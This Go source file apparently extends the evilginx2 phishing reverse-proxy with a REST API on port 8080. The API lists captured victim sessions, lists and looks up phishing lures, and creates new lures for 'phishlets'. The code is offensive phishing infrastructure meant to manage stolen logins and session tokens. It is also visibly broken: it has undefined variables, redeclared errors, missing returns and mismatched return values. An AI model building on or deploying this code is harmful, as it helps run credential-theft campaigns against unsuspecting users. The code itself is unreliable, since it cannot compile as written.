package core

import (
	"encoding/json"
	"fmt"
	"io"
	"net/url"
	"strconv"
	"strings"
	"time"
	"github.com/emicklei/go-restful"
	"net/http"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/parser"
)


type ListenServer struct {
	cfg       *Config
	crt_db    *CertDb
	db        *database.Database
//	hlp       *Help
	developer bool
}

func NewListenServer(cfg *Config, crt_db *CertDb, db *database.Database, developer bool) {
	ls := &ListenServer {
		cfg:       cfg,
		crt_db:    crt_db,
		db:        db,
		developer: developer,
	}
	restful.DefaultContainer.Add(ls.WebService())
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func (t *ListenServer) WebService() (*restful.WebService, error) {
	var err error

	/*
		t.completer = readline.NewPrefixCompleter(
			readline.PcItem("server"),
			readline.PcItem("ip"),
			readline.PcItem("status"),
			readline.PcItem("phishlet", readline.PcItem("show"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("hostname"), readline.PcItem("url")),
			readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))),
			readline.PcItem("exit"),
		)
	*/
	ws := new(restful.WebService)
	ws.Path("/api").Produces(restful.MIME_JSON)

	ws.Route(ws.GET("/sessions").To(t.getSessions))
	ws.Route(ws.GET("/lures").To(t.getAllLures))
	ws.Route(ws.GET("/lures/{lure-id}").To(t.getLure))
	ws.Route(ws.POST("/lures").To(t.createLure))

	if err != nil {
		return nil, err
	}
	return ws, nil
}

func (t *ListenServer) getSessions(req *restful.Request, resp *restful.Response) {
	sessions, err := t.db.ListSessions()
	fmt.Println("getSessions")
	resp.WriteEntity(sessions)
}

func (t *ListenServer) getAllLures(req *restful.Request, resp *restful.Response) {
	fmt.Println("getLures")
	resp.WriteEntity(t.cfg.lures)
}

func (t *ListenServer) getLure(req *restful.Request, resp *restful.Response) {
	l_id, err := strconv.Atoi(strings.TrimSpace(req.PathParameter("lure-id")))
	if err != nil {
		resp.WriteErrorString(http.StatusNotFound, "Lure could not be found.")
	}
	l, err := t.cfg.GetLure(l_id)
	if err != nil {
		resp.WriteErrorString(http.StatusNotFound, "Lure could not be found.")
	}
	pl, err := t.cfg.GetPhishlet(l.Phishlet)
	if err != nil {
		resp.WriteErrorString(http.StatusNotFound, "Lure could not be found.")
	}
	bhost, ok := t.cfg.GetSiteDomain(pl.Site)
	if !ok || len(bhost) == 0 {
		resp.WriteErrorString(http.StatusNotFound, "Lure could not be found.")
	}
	purl, err := pl.GetLureUrl(l.Path)
	if err != nil {
		resp.WriteErrorString(http.StatusNotFound, "Lure could not be found.")
	}
	resp.WriteAsJson(purl)
}

func (t *ListenServer) createLure(req *restful.Request, resp *restful.Response) {
	pl, err := req.BodyParameter("phishlet")
	if err != nil {
		resp.WriteErrorString(http.StatusNotFound, "Phishlet could not be found.")
	}
	_, err := t.cfg.GetPhishlet(pl)
	if err != nil {
		resp.WriteErrorString(http.StatusNotFound, "Phishlet could not be found.")
	}
	l := &Lure{
		Path:     "/" + GenRandomString(8),
		Phishlet: args[1],
		Params:   make(map[string]string),
	}
	t.cfg.AddLure(pl, l)
	log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
	resp.WriteHeader(http.StatusCreated)
}